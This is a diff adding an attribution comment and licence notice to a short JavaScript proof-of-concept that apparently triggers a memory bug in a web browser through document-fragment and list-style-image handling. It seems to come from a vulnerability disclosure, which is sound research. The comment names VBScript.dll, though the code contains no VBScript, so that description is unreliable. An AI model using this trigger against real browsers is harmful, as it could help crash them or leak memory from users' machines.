@@ -1,7 +1,11 @@
 <script>
+  // This PoC attempts to exploit a memory disclosure bug in VBScript.dll
+  // See http://blog.skylined.nl/20161102001.html for details.
   var oDocumentFragment = document.createDocumentFragment(),
       oElement = document.createElement('x');
   oDocumentFragment.appendChild(oElement);
   oElement.style.listStyleImage = "url(x)";
   oDocumentFragment.removeChild(oElement);
+  // This work by SkyLined is licensed under a Creative Commons
+  // Attribution-Non-Commercial 4.0 International License. 
 </script>
